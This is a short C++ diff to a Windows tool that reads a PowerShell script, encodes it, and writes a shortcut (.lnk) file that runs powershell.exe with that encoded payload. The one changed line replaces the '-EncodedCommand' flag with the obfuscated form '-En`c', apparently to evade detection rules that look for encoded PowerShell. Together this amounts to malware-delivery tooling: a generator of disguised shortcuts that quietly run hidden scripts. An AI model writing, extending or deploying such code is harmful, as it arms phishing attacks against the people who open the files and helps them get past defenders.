@@ -57,7 +57,7 @@ int wmain(int argc, wchar_t* argv[]) {
             std::wstring psFilePath = argv[1]; // PowerShell script path from command line argument
             std::wstring encodedContent = ReadAndEncodeFile(psFilePath);
 
-            std::wstring command = L"powershell.exe -EncodedCommand " + encodedContent;
+            std::wstring command = L"powershell.exe -En`c " + encodedContent;
             std::wcout << encodedContent;
             pShellLink->SetPath(L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
             pShellLink->SetArguments(command.c_str());
